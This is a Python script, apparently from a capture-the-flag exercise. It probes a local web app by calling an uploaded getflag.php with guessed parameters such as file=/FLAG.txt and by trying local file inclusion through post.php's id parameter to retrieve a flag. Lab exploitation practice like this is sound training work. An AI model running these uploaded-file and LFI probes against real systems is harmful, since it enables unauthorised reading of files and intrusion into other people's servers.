import requests

base_url = "http://127.0.0.1:32891"

print("[+] Investigating getflag.php...")

# Direct access
resp = requests.get(f"{base_url}/posts/uploads/getflag.php")
print(f"Direct access:")
print(f"Status: {resp.status_code} | Length: {len(resp.text)}")
print(f"Full content:")
print(resp.text)
print("\n" + "="*80 + "\n")

# Try various parameters
print("[+] Testing getflag.php with parameters...")

params_to_test = [
    {},
    {'read': 'true'},
    {'read': '1'},
    {'action': 'read'},
    {'cat': 'true'},
    {'show': 'true'},
    {'display': 'true'},
    {'get': 'true'},
    {'flag': 'true'},
    {'file': 'FLAG.txt'},
    {'file': '/FLAG.txt'},
]

for params in params_to_test:
    resp = requests.get(f"{base_url}/posts/uploads/getflag.php", params=params)
    
    if "FLAG{" in resp.text:
        print(f"\n[!!!] FOUND FLAG with params: {params}")
        print(resp.text)
        
        # Extract flag
        import re
        flags = re.findall(r'FLAG\{[^}]+\}', resp.text)
        for flag in flags:
            print(f"\n[!!!] FLAG: {flag}")
        break
    elif resp.text != "-rw-r--r--   1 root root   70 Dec 27 18:59 FLAG.txt":
        print(f"\nParams: {params}")
        print(f"Response (different): {resp.text}")

# Try including it through LFI
print("\n[+] Including getflag.php through LFI...")
resp = requests.get(f"{base_url}/post.php", params={'id': 'uploads/getflag'})
print(f"Status: {resp.status_code} | Length: {len(resp.text)}")

if "FLAG{" in resp.text:
    print("\n[!!!] FOUND FLAG through LFI!")
    print(resp.text)
else:
    print(f"First 500 chars: {resp.text[:500]}")

